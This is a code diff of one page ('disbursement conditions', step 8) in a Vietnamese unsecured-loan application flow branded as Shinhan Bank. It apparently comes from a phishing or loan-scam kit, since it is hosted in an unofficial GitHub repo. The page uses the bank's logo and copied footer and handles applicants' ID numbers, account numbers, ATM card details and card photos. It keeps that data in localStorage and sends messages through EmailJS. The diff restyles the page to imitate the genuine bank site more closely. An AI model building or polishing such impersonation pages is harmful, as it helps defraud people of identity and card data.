@@ -5,59 +5,95 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Điều Kiện Giải Ngân - Shinhan Bank</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: 'Roboto', sans-serif;
             font-size: 16px;
-            background-color: #f8f9fa;
             margin: 0;
         }
         .header {
-            text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
+            padding: 15px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #b3cde0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .header img {
-            height: 50px;
+            height: 35px;
         }
-        .header h1 {
-            font-size: 26px;
-            font-weight: 700;
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header-icons i {
+            font-size: 24px;
+            cursor: pointer;
+            color: #0052cc;
         }
         .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative;
-        }
-        .progress-bar-container {
-            margin-bottom: 20px;
-        }
-        .progress-bar {
-            height: 20px;
-            background-color: #e9ecef;
+            max-width: 90%;
+            width: 100%;
+            margin: 15px 5%;
+            padding: 15px;
+            background: #ffffff;
             border-radius: 10px;
-            overflow: hidden;
+            box-shadow: 0 0 15px rgba(0, 82, 204, 0.1);
         }
-        .progress-bar-fill {
-            height: 100%;
-            background-color: #28a745;
-            transition: width 0.3s ease-in-out;
+        @media (min-width: 768px) {
+            .container {
+                max-width: 700px;
+                margin: 15px 5%;
+            }
         }
-        .step-title {
-            color: #003087;
+        .nav-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 15px;
+            margin-top: 10px;
+            flex-wrap: nowrap;
+        }
+        .nav-tabs .nav-item {
+            flex: 1;
+            text-align: center;
+        }
+        .nav-tabs .nav-link {
+            background-color: #d3d3d3;
+            color: #ffffff;
+            border-radius: 20px;
+            padding: 8px 10px;
+            font-weight: 500;
+            font-size: 12px;
+            width: 100%;
+            margin: 0 2px;
+            white-space: nowrap;
+        }
+        .nav-tabs .nav-link.active {
+            background-color: #0033a0;
+            color: #ffffff;
+        }
+        @media (max-width: 767px) {
+            .nav-tabs .nav-link {
+                font-size: 10px;
+                padding: 6px 8px;
+            }
+        }
+        .section-title {
+            color: #0033a0;
             font-size: 18px;
             font-weight: 700;
+            margin-bottom: 10px;
+            text-transform: uppercase;
             text-align: center;
         }
         .step-description {
-            font-size: 16px;
+            font-size: 14px;
             text-align: center;
+            color: #333;
+            margin-bottom: 20px;
         }
         .image-section {
             text-align: center;
@@ -69,7 +105,7 @@
             min-height: 850px;
             margin: 20px auto;
             display: block;
-            border: 2px solid #e9ecef;
+            border: 1px solid #b3cde0;
             border-radius: 8px;
             image-rendering: -webkit-optimize-contrast;
             image-rendering: crisp-edges;
@@ -78,67 +114,73 @@
             opacity: 0.5;
             background: url('https://via.placeholder.com/50x50?text=Loading') center center no-repeat;
         }
-        .btn-download {
-            background-color: #17a2b8;
-            color: white;
-            font-size: 16px;
-            font-weight: 700;
-            padding: 8px 16px;
-            transition: all 0.3s ease;
-        }
-        .btn-download:hover {
-            background-color: #138496;
-            transform: translateY(-2px);
-        }
         .btn-primary {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            background-color: #003087;
+            background-color: #0033a0;
             border: none;
-            transition: all 0.3s ease;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 700;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
         }
         .btn-primary:hover {
-            background-color: #00205B;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(0, 32, 91, 0.3);
+            background-color: #0052cc;
         }
         .btn-secondary {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            background-color: #6c757d;
+            background-color: #0033a0;
             border: none;
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            transition: all 0.3s ease;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 700;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
         }
         .btn-secondary:hover {
-            background-color: #5a6268;
-            transform: translateY(-2px);
+            background-color: #0052cc;
         }
         .footer {
+            background-color: #0033a0;
+            color: #ffffff;
             text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
-            margin-top: 20px;
-            font-size: 16px;
+            padding: 15px;
+            font-size: 12px;
         }
-        .footer img.lock-icon {
-            vertical-align: middle;
-            margin-right: 10px;
+        .footer-links a {
+            color: #b3cde0;
+            margin: 0 8px;
+            text-decoration: none;
         }
-        .footer-logo {
-            height: 40px;
-            margin-top: 10px;
+        .footer-links a:hover {
+            color: #ffffff;
         }
         .button-group {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-top: 10px;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        @media (max-width: 767px) {
+            .button-group {
+                flex-direction: row;
+                justify-content: center;
+            }
+            .button-group a, .button-group button {
+                flex: 1;
+                text-align: center;
+            }
+        }
+        .dropdown-menu {
+            min-width: 200px;
+        }
+        .dropdown-menu a {
+            color: #0033a0;
+            text-transform: uppercase;
+            font-size: 14px;
+            padding: 8px 12px;
+        }
+        .dropdown-menu a:hover {
+            background-color: #e6f0fa;
+            color: #0052cc;
         }
         .step-transition {
             transition: opacity 0.5s ease, transform 0.5s ease;
@@ -154,35 +196,60 @@
 </head>
 <body>
     <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <h1>Đăng Ký Vay Tín Chấp</h1>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
+        <div class="header-icons">
+            <i class="bi bi-search"></i>
+            <div class="dropdown">
+                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
+                <ul class="dropdown-menu dropdown-menu-end">
+                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
+                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
+                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
+                </ul>
+            </div>
+        </div>
     </div>
 
     <div class="container">
-        <button type="button" class="btn btn-secondary" onclick="window.location.href='step8.html'">Quay Lại</button>
-        <div class="progress-bar-container">
-            <div class="progress-bar">
-                <div class="progress-bar-fill" id="progressBar" style="width: 90%"></div>
-            </div>
-        </div>
+        <ul class="nav-tabs">
+            <li class="nav-item">
+                <a class="nav-link" href="#">1. Nhập thông tin</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link active" href="#">3. Hoàn thành</a>
+            </li>
+        </ul>
 
-        <div id="step9" class="step-transition">
-            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
+        <div id="step8" class="step-transition">
+            <h5 class="section-title">ĐIỀU KIỆN GIẢI NGÂN</h5>
             <p class="step-description">Dưới đây là điều kiện giải ngân của bạn. Vui lòng kiểm tra kỹ thông tin.</p>
             <div class="image-section">
                 <canvas id="disbursementCanvas"></canvas>
             </div>
             <div class="button-group">
-                <button id="downloadDisbursementBtn" class="btn btn-download">Tải Điều Kiện Giải Ngân (PDF)</button>
-                <button id="proceedToFinalStepBtn" class="btn btn-primary">Hoàn Tất</button>
+                <a href="step7.html" class="btn btn-secondary">QUAY LẠI</a>
+                <button id="downloadDisbursementBtn" class="btn btn-primary">TẢI ĐIỀU KIỆN GIẢI NGÂN (PDF)</button>
+                <button id="proceedToFinalStepBtn" class="btn btn-primary">HOÀN TẤT</button>
             </div>
         </div>
+    </div>
 
-        <div class="footer">
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
-            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Chính sách bảo mật</a> |
+            <a href="#">Điều khoản sử dụng</a> |
+            <a href="#">Chính sách Cookies</a> |
+            <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+            <a href="#">Hướng dẫn truy cập web</a> |
+            <a href="#">Sitemap</a>
         </div>
+        <p class="mt-2">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -190,12 +257,10 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS
         (function(){
             emailjs.init("OrBsI926QI2_xBh1f");
         })();
 
-        // Placeholder user data (aligned with Step1)
         let userData = {
             fullName: "",
             idNumber: "",
@@ -232,16 +297,14 @@
                 frontImage: "",
                 backImage: ""
             },
-            currentStep: 9
+            currentStep: 8
         };
 
-        // Format number to VND
         function formatNumber(number) {
             if (!number) return "Không có";
             return Number(number).toLocaleString('vi-VN');
         }
 
-        // Save to localStorage
         function saveToLocalStorage() {
             try {
                 localStorage.setItem('userData', JSON.stringify(userData));
@@ -251,13 +314,12 @@
             }
         }
 
-        // Load user data
         function loadUserData() {
             try {
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
                     userData = JSON.parse(storedData);
-                    console.log('Loaded userData from localStorage for Step9:', userData);
+                    console.log('Loaded userData from localStorage for Step8:', userData);
                 } else {
                     console.warn('No userData found in localStorage, using default.');
                 }
@@ -266,7 +328,6 @@
             }
         }
 
-        // Render image and text on canvas
         function renderCanvas(canvasId, imageUrl, fallbackUrl) {
             const canvas = document.getElementById(canvasId);
             const ctx = canvas.getContext('2d');
@@ -315,7 +376,6 @@
             };
         }
 
-        // Define text fields for canvas
         const canvasFields = [
             { label: "", value: userData.loanCode || "Không có", x: 414, y: 193, font: "54px Arial bold", color: "#000000" },
             { label: "", value: userData.accountNumber || "Không có", x: 846, y: 643, font: "46px Arial bold", color: "#000000" },
@@ -329,7 +389,6 @@
             { label: "", value: userData.atmCard?.cardHolderName || "Không có", x: 846, y: 1094, font: "46px Arial bold", color: "#000000" }
         ];
 
-        // Download canvas as PDF
         function downloadAsPDF(canvas, filename) {
             const { jsPDF } = window.jspdf;
             const pdf = new jsPDF({
@@ -341,19 +400,16 @@
             pdf.save(filename);
         }
 
-        // Load user data and populate fields
         window.onload = function() {
             loadUserData();
             renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/2480x3508?text=Hinh+Dieu+Kien+Giai+Ngan');
         };
 
-        // Download disbursement conditions
         $('#downloadDisbursementBtn').on('click', function() {
             const canvas = document.getElementById('disbursementCanvas');
             downloadAsPDF(canvas, `DieuKienGiaiNgan_${userData.loanCode || 'unknown'}.pdf`);
         });
 
-        // Proceed to final step
         $('#proceedToFinalStepBtn').on('click', function() {
             const params = {
                 to_name: userData.fullName || 'Khách hàng',
@@ -363,7 +419,6 @@
                 to_email: userData.email || 'support@shinhan.com.vn'
             };
             emailjs.send('service_60tgxof', 'template_uhyb8ve', params).then(() => {
-                alert("Thông báo hoàn tất đăng ký đã được gửi qua email cho quý khách!");
                 userData.isRegistered = true;
                 userData.isCompleted = true;
                 userData.currentStep = 10;
@@ -371,7 +426,6 @@
                 window.location.href = 'step10.html';
             }).catch(error => {
                 console.error('EmailJS error:', error);
-                alert("Đã xảy ra lỗi khi gửi email. Vui lòng thử lại.");
             });
         });
     </script>
